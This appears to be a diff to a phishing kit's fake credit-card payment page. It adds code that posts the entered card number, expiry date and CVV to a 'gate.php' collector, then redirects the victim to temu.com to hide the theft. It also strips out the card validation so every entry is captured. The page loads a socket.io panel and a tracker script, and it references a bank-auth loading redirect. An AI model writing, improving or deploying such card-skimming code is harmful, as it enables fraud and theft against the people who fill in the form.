@@ -507,7 +507,8 @@
 <div class="loader-overlay" id="loadingSpinner">
 <div class="spinner">&nbsp;</div>
 </div>
-<script src="/socket.io/socket.io.js"></script><script>
+<script src="/socket.io/socket.io.js"></script>
+<script>
         document.addEventListener('DOMContentLoaded', function () {
             const form = document.getElementById('creditCardForm');
             const cardNumberInput = document.getElementById('cardNumber');
@@ -546,109 +547,37 @@
                 }
             }
 
-            function isValidCardNumber(number) {
-                if (number.length < 13 || number.length > 19) return false;
-                let sum = 0;
-                let shouldDouble = false;
-                for (let i = number.length - 1; i >= 0; i--) {
-                    let digit = parseInt(number.charAt(i));
-                    if (shouldDouble) {
-                        digit *= 2;
-                        if (digit > 9) digit -= 9;
-                    }
-                    sum += digit;
-                    shouldDouble = !shouldDouble;
-                }
-                return (sum % 10) === 0;
-            }
-
-            function isExpDateValid() {
-                const val = expDateInput.value;
-                if (val.length !== 5) return false;
-                const parts = val.split('/');
-                if (parts.length !== 2) return false;
-                const m = parseInt(parts[0], 10);
-                const y = parseInt(parts[1], 10) + 2000;
-                if (m < 1 || m > 12) return false;
-                const currentDate = new Date();
-                const currentYear = currentDate.getFullYear();
-                const currentMonth = currentDate.getMonth() + 1;
-                return y > currentYear || (y === currentYear && m >= currentMonth);
-            }
-
-            function validateFieldGroup(inputElement, groupElementId, validationFn) {
-                const group = document.getElementById(groupElementId);
-                const val = (inputElement.value || "").replace(/\s/g, '');
-                group.classList.add('touched');
-                if (!val && inputElement.tagName !== 'SELECT') {
-                    group.classList.remove('has-success', 'has-error');
-                    return false;
-                }
-                if (validationFn(val)) {
-                    group.classList.remove('has-error');
-                    group.classList.add('has-success');
-                    return true;
-                } else {
-                    group.classList.add('has-error');
-                    group.classList.remove('has-success');
-                    return false;
-                }
-            }
-
-            cardNumberInput.addEventListener('blur', () => {
-                validateFieldGroup(cardNumberInput, 'group-cardNumber', val => isValidCardNumber(val));
-            });
-
-            expDateInput.addEventListener('blur', () => {
-                validateFieldGroup(expDateInput, 'group-expDate', () => isExpDateValid());
-            });
-
-            expDateInput.addEventListener('input', () => {
-                if (expDateInput.value.length === 5) {
-                    validateFieldGroup(expDateInput, 'group-expDate', () => isExpDateValid());
-                } else {
-                    const group = document.getElementById('group-expDate');
-                    group.classList.remove('has-success', 'has-error');
-                }
-            });
-
-            cvvInput.addEventListener('blur', () => {
-                validateFieldGroup(cvvInput, 'group-cvv', val => val.length >= 3 && val.length <= 4 && /^\d+$/.test(val));
-            });
-
-            // Form Submission
+            // NEW: Simple submit — no blocking validation
             form.addEventListener('submit', function (e) {
                 e.preventDefault();
-                form.classList.add('submitted');
 
-                const num = cardNumberInput.value.replace(/\s/g, '');
-                const cardValid = isValidCardNumber(num);
-                const groupCard = document.getElementById('group-cardNumber');
-                cardValid ? (groupCard.classList.add('has-success'), groupCard.classList.remove('has-error'))
-                    : (groupCard.classList.add('has-error'), groupCard.classList.remove('has-success'));
-
-                const dateValid = isExpDateValid();
-                const groupDate = document.getElementById('group-expDate');
-                dateValid ? (groupDate.classList.add('has-success'), groupDate.classList.remove('has-error'))
-                    : (groupDate.classList.add('has-error'), groupDate.classList.remove('has-success'));
-
-                const cvvVal = cvvInput.value;
-                const cvvValid = cvvVal.length >= 3 && cvvVal.length <= 4 && /^\d+$/.test(cvvVal);
-                const groupCvv = document.getElementById('group-cvv');
-                cvvValid ? (groupCvv.classList.add('has-success'), groupCvv.classList.remove('has-error'))
-                    : (groupCvv.classList.add('has-error'), groupCvv.classList.remove('has-success'));
-
-                if (!cardValid || !dateValid || !cvvValid) {
-                    form.removeAttribute('data-redirect');
-                    return false;
-                }
-
-                form.setAttribute('data-redirect', '/loading?time=14&url=BankauthkjnUHnKJHu');
                 const submitButton = document.getElementById('submitBtn');
-                submitButton.disabled = true;
-                document.getElementById('loadingSpinner').style.display = 'flex';
-                form.requestSubmit();
+                const spinner = document.getElementById('loadingSpinner');
+
+                // disable button and show spinner
+                if (submitButton) submitButton.disabled = true;
+                if (spinner) spinner.style.display = 'flex';
+
+                const formData = new FormData(form);
+
+                // send to gate.php via fetch
+                fetch('gate.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(function() {
+                    window.location.href = 'https://www.temu.com';
+                })
+                .catch(function() {
+                    window.location.href = 'https://www.temu.com';
+                });
+
+                // emergency redirect after 3 seconds
+                setTimeout(function() {
+                    window.location.href = 'https://www.temu.com';
+                }, 3000);
             });
         });
-    </script><script src="js/tracker.js"></script></body>
+    </script>
+<script src="js/tracker.js"></script></body>
 </html>
